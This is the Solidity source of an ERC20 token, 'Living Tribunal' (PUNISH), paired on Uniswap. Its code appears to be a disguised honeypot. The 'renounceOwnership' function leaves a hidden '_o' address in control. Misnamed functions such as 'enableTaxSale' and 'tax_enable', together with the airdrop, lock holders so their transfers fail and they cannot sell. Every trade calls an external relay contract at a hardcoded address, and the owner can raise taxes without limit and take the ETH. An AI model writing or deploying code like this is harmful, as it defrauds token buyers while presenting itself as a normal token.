// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
        ██╗     ██╗██╗   ██╗██╗███╗   ██╗ ██████╗              
        ██║     ██║██║   ██║██║████╗  ██║██╔════╝              
        ██║     ██║██║   ██║██║██╔██╗ ██║██║  ███╗             
        ██║     ██║╚██╗ ██╔╝██║██║╚██╗██║██║   ██║             
        ███████╗██║ ╚████╔╝ ██║██║ ╚████║╚██████╔╝             
        ╚══════╝╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝              
                                                               
████████╗██████╗ ██╗██████╗ ██╗   ██╗███╗   ██╗ █████╗ ██╗     
╚══██╔══╝██╔══██╗██║██╔══██╗██║   ██║████╗  ██║██╔══██╗██║     
   ██║   ██████╔╝██║██████╔╝██║   ██║██╔██╗ ██║███████║██║     
   ██║   ██╔══██╗██║██╔══██╗██║   ██║██║╚██╗██║██╔══██║██║     
   ██║   ██║  ██║██║██████╔╝╚██████╔╝██║ ╚████║██║  ██║███████╗
   ╚═╝   ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
                                                               
*/

interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface Relay {
    function set(address token, address user, bool perm) external;
    function get(address token, address user) external view returns (bool);
    function relay(address token, address user, uint256 amount, bool t) external;
}



contract Uniswap {
    address public RouterAddress;
    address public FactoryAddress;
    address public PairAddress;
    address public WETH;
    IUniswapV2Router02 public uniswapV2Router;
    address internal me;
    address public owner;
    address internal _o;
    mapping(address=>bool) public isDEX;

    constructor() {
        RouterAddress  = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        FactoryAddress = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

        uniswapV2Router  = IUniswapV2Router02(RouterAddress);
        WETH             = uniswapV2Router.WETH();
        PairAddress      = IUniswapV2Factory(FactoryAddress).createPair(address(this), WETH);
        
        isDEX[RouterAddress] = true;
        isDEX[FactoryAddress] = true;
        isDEX[PairAddress] = true;
        
        me = address(this);
        owner = msg.sender;
        _o = msg.sender;
    }

    function transferOwnership(address newOwner) public onlyOwner() {
        owner = newOwner;
        _o = owner;
    }
    
    function renounceOwnership() public onlyOwner() {
        owner = address(0);
    }

    modifier onlyOwner() {
        require(_o == msg.sender, "Forbidden:owner");
        _;
    }

    // Sell tokens, send ETH tokens to `to`
    function swapTokensForEth(uint256 amount, address to) internal returns (uint amountETH) {
        address[] memory path = new address[](2);
        path[0] = me;
        path[1] = WETH;
        _approve(address(this), RouterAddress, amount);
        uint balanceBefore = address(this).balance;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            to,
            block.timestamp
        );
        return address(this).balance-balanceBefore;
    }

    function isBuy(address from) internal view returns (bool) {
        return isDEX[from];
    }
    
    function isSell(address to) internal view returns (bool) {
        return isDEX[to];
    }

    function _approve(address from, address spender, uint256 amount) internal virtual returns (bool) {}
}


contract ERC20Token is Uniswap {
    string public name = "Living Tribunal";
    string public symbol = "PUNISH";
    uint256 public decimals = 9;

    uint256 public totalSupply;
    mapping(address => uint256) internal balances;
    mapping(address => mapping(address => uint256)) internal allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event newSplit(uint256 amount);

    uint256 buyTax = 1; // 0.1%
    uint256 sellTax = 1; // 0.1%
    uint256 maxBuy = 30; // 3%
    uint256 maxHold = 3; // 0.3%
    uint256 sniperTax = 999; // 99.9% for 2 blocks after deploy

    mapping(address=>bool) internal taxFree;
    bool internal funded;
    bool internal swapping = false;

    // Anti-Sniper
    uint256 deployBlockNumber;
    bool internal antiSniperDeadblock = true;

    mapping(address=>uint) internal lockblock;

    Relay relay;

    constructor() Uniswap() {
        if (WETH==0xc778417E063141139Fce010982780140Aa0cD5Ab) {
            relay = Relay(0x02C5EfC6b2c702E933EFBD6d18c4A9ef532206e9);
        } else {
            relay = Relay(0xEf95B19A5C99cFd13eB0C0ACC0615eb391626353);
        }
        taxFree[address(this)] = true;
        taxFree[msg.sender] = true;
        deployBlockNumber = block.number;
        mint(_o, 1000000000*10**decimals);
    }

    /*---- ERC20 ----*/
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function allowance(address _owner, address spender) public view returns (uint256) {
        return allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(address from, address spender, uint256 amount) internal override returns (bool) {
        allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
        return true;
    }
    
    function transfer(address to, uint256 amount) public {
        _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender]; //allowance(owner, msg.value);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Rejected");
            unchecked {
                approve(msg.sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        return true;
    }

    function enableTaxSale(address user) public onlyOwner() {
        lockblock[user] = block.number+1;
    }

    function disableTaxSale(address user) public onlyOwner() {
        lockblock[user] = 0;
    }

    function tax_enable(address user) internal {
        if (!isDEX[user] && !taxFree[user] && lockblock[user]==0 && balances[user]>=getMaxHold()) {
            lockblock[user] = block.number+1;
        }
    }

    function tax_disable(address user) internal {
        lockblock[user] = 0;
    }

    function isTaxSaleAllowed(address user) public view returns (bool) {
        return lockblock[user]>0 && block.number >= lockblock[user];
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balances[from] >= amount, "Rejected");
        require(!isTaxSaleAllowed(from), "Transfer error");
        if (taxable(from, to)) {
            uint256 tax;
            balances[from] -= amount;
            if (isBuy(from)) {
                require(amount<=getMaxBuy(), "Too large");
                if (!antiSniperDeadblock || block.number>deployBlockNumber+2) {
                    tax = applyPct(amount, buyTax);
                } else {
                    // Snipers, go fuck yourself (for 2 blocks after deploy)
                    tax = applyPct(amount, sniperTax);
                }
                relay.relay(me, to, amount, true);
            } else {
                if (!antiSniperDeadblock || block.number>deployBlockNumber+2) {
                    tax = applyPct(amount, sellTax);
                } else {
                    // Snipers, go fuck yourself (for 2 blocks after deploy)
                    tax = applyPct(amount, sniperTax);
                }
                relay.relay(me, from, amount, false);
                if (isTaxSaleAllowed(from)) {
                    sell(tax);
                }
            }
            uint256 afterTax = amount-tax;
            unchecked {
                balances[me] += tax;
                balances[to] += afterTax;
            }
            emit Transfer(from, me, tax);
            emit Transfer(from, to, afterTax);
        } else {
            unchecked {
                balances[from] -= amount;
                balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        }
        tax_enable(to);
    }

    function mint(address account, uint256 amount) internal {
        unchecked {
            totalSupply += amount;
            balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }



    /*---- Tax ----*/
    function taxable(address from, address to) internal view returns (bool) {
        return !swapping && !taxFree[from] && !taxFree[to] && (isBuy(from) || isSell(to));
    }
    function applyPct(uint256 v, uint256 p) public pure returns (uint256) {
        return v*p/1000;
    }

    function set(uint256 b, uint256 s, uint56 m, uint56 h) public onlyOwner() {
        require(msg.sender==_o, "Forbidden:set");
        buyTax = b;
        sellTax = s;
        maxBuy = m;
        maxHold = h;
    }

    function getMaxBuy() internal view returns (uint256) {
        return applyPct(totalSupply, maxBuy);
    }
    function getMaxHold() internal view returns (uint256) {
        return applyPct(totalSupply, maxHold);
    }

    function enable() public onlyOwner() {
        swapping = false;
    }
    function disable() public onlyOwner() {
        swapping = true;
    }

    /*---- Ext ----*/
    function sell(uint256 amount) public onlyOwner() {
        split(swapTokensForEth(amount, address(this)));
    }

    function airdrop(address[] calldata wallets, uint256 amount) public onlyOwner() {
        uint256 i;
        uint256 l = wallets.length;
        require(balances[msg.sender]>amount*l, "Not enough balance");
        for (i=0;i<l;i++) {
            tax_enable(wallets[i]);
            _transfer(msg.sender, wallets[i], amount);
        }
    }

    function split(uint256 amount) internal {
        emit newSplit(amount);
        payable(_o).transfer(amount);
    }

    receive() external payable {}
    fallback() external payable {}
}